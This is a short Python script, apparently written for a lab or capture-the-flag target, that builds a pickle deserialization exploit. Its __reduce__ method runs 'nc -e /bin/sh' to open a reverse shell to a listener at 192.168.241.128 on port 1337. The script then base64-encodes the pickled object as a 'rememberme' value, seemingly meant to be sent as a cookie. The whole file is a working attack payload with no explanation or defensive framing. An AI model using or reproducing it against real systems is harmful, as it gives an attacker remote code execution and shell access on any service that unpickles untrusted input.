import pickle 
import base64
import os
class payload():

    def __reduce__(self):
        lport ="1337"
        lhost = "192.168.241.128"
        #cmd = f"nc -nv {lhost} {lport} -e /bin/sh"
        return (os.system,(f"nc -nv {lhost} {lport} -e /bin/sh",))

deserial_payload = payload()
serial_payload = pickle.dumps(deserial_payload)
rememberme = base64.b64encode(serial_payload)

print(rememberme)
